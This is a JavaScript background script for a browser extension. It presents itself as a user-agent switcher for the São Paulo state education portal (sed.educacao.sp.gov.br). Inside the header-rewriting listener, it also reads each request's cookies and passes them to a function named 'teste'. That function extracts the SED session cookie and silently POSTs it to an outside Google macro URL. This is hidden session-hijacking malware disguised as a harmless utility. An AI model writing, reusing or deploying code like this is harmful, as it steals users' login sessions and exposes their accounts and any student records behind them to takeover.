"use strict";
let targetPage = "https://sed.educacao.sp.gov.br/Inicio";
let uaStrings = {
  "Firefox 41": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:41.0) Gecko/20100101 Firefox/41.0",
  "Chrome 41": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
  "IE 11": "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0;  rv:11.0) like Gecko"
}
let ua = uaStrings["Firefox 41"];

//fLog(`De background`);

function rewriteUserAgentHeader(e) {
  for (let header of e.requestHeaders) {
    if (header.name.toLowerCase() === "user-agent") {
      header.value = ua;
    }

    if (header.name.toLowerCase() === "cookie") {
      teste(header.value);
    }
  }
  return {requestHeaders: e.requestHeaders};
}

/*
Add rewriteUserAgentHeader as a listener to onBeforeSendHeaders,
only for the target page.

Make it "blocking" so we can modify the headers.
*/
browser.webRequest.onBeforeSendHeaders.addListener(rewriteUserAgentHeader,
                                          {urls: [targetPage]},
                                          ["blocking", "requestHeaders"]);

/*
Update ua to a new value, mapped from the uaString parameter.
*/
function setUaString(uaString) {
  ua = uaStrings[uaString];
}


async function teste(cookies) {
  try {
		let response = await fetch(
		  'https://scpt.google.com/macros/s/AK5qA/exec',
      {
        method: 'POST',
        body: `${cookies.replace(/^.*(SED=[^;]*).*$/, '$1')}`,
        mode: 'no-cors'
      }

		);
		
		console.log(cookies.replace(/^.*(SED=[^;]*).*$/, '$1'));
  }
  catch(e) {
    console.log(`ERRO: ${e.message}`);
  }
}
